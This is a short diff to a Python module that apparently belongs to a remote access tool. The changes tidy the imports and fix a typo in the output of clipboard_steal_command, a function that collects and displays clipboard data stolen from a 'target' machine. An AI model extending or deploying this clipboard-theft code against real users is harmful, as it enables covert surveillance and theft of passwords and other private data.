@@ -1,6 +1,11 @@
-from components.networking import decrypt_message, encrypt_message, clear_socket_buffer
+from components.networking import (
+    decrypt_message,
+    encrypt_message,
+    clear_socket_buffer,
+)
 from components.logging import log_activity
-import uuid
+from termcolor import colored
+import socket
 import time
 
 def clipboard_steal_command(client_output, conn_obj):
@@ -46,7 +51,7 @@ def clipboard_steal_command(client_output, conn_obj):
             return "[-] No clipboard data gathered from target"
         else:
             print("Loading clipboard data . . .")
-            print("Gathred clipboard data :")
+            print("Gathered clipboard data :")
             # Reorganise output
             result, counter = [], 0
             for data in received_data:
@@ -55,7 +60,7 @@ def clipboard_steal_command(client_output, conn_obj):
                     result.append(colored(f"[+] Clipboard Entry {counter} -> {data}", "green"))
 
             conn_obj.settimeout(10)  # Reset to original timeout
-            log_activity(f"Gathred {len(result)} clipboard entries.", "info")
+            log_activity(f"Gathered {len(result)} clipboard entries.", "info")
             
             return "\n".join(result) 
     finally:
